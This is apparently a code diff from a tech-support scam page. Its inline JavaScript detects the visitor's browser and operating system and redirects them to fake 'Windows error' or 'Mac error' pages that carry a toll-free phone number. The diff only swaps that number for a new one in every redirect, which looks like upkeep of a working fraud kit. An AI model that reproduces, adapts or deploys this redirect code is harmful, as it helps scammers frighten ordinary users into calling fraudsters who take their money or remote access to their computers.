@@ -17,21 +17,21 @@
         if (isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false)
         {
             // is Google chrome
-            window.location.href = "./Wi0n0Err0Rht0003/index.html?phone=+1-(833)942-0307";
+            window.location.href = "./Wi0n0Err0Rht0003/index.html?phone=+1-(833)942-0221";
         }
         if (navigator.userAgent.indexOf("Firefox") != -1) {
-            window.location.href = "./Wi0n0Err0Rht0003/index.html?phone=+1-(833)942-0307";
+            window.location.href = "./Wi0n0Err0Rht0003/index.html?phone=+1-(833)942-0221";
         }
         if (window.navigator.userAgent.indexOf("Edge") != -1) {
-            window.location.href = "./Wi0n0Err0Rht0003/index.html?phone=+1-(833)942-0307";
+            window.location.href = "./Wi0n0Err0Rht0003/index.html?phone=+1-(833)942-0221";
         }
 if (window.navigator.userAgent.indexOf("Opera") != -1) {
-            window.location.href = "./Wi0n0Err0Rht0003/index.html?phone=+1-(833)942-0307";
+            window.location.href = "./Wi0n0Err0Rht0003/index.html?phone=+1-(833)942-0221";
         }
 
         if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) //IF IE > 10
         {
-            window.location.href = "./Wi0n0Err0Rht0003/index.html?phone=+1-(833)942-0307";
+            window.location.href = "./Wi0n0Err0Rht0003/index.html?phone=+1-(833)942-0221";
         }
 
 
@@ -46,22 +46,22 @@ if (window.navigator.userAgent.indexOf("Opera") != -1) {
         var isIE = /*@cc_on!@*/false;                            // At least IE6
 
         if (OSName == "MacOS" && isChrome == true) {
-            window.location.href = "./Ma0c0Err0Rht0003/index.html?phone=+1-(833)942-0307";
+            window.location.href = "./Ma0c0Err0Rht0003/index.html?phone=+1-(833)942-0221";
         }
         else if (OSName == "MacOS" && isChrome == true) {
-            window.location.href = "./Ma0c0Err0Rht0003/index.html?phone=+1-(833)942-0307";
+            window.location.href = "./Ma0c0Err0Rht0003/index.html?phone=+1-(833)942-0221";
         }
 
         if (navigator.userAgent.indexOf("Firefox") != -1) {
-            window.location.href = "./Ma0c0Err0Rht0003/index.html?phone=+1-(833)942-0307";
+            window.location.href = "./Ma0c0Err0Rht0003/index.html?phone=+1-(833)942-0221";
         }
 
         if (window.navigator.userAgent.indexOf("Opera") != -1) {
-            window.location.href = "./Ma0c0Err0Rht0003/index.html?phone=+1-(833)942-0307";
+            window.location.href = "./Ma0c0Err0Rht0003/index.html?phone=+1-(833)942-0221";
         }
 
         if (navigator.userAgent.indexOf("Safari") != -1) {
-            window.location.href = "./Ma0c0Err0Rht0003/index.html?phone=+1-(833)942-0307";
+            window.location.href = "./Ma0c0Err0Rht0003/index.html?phone=+1-(833)942-0221";
         }
 
     </script>
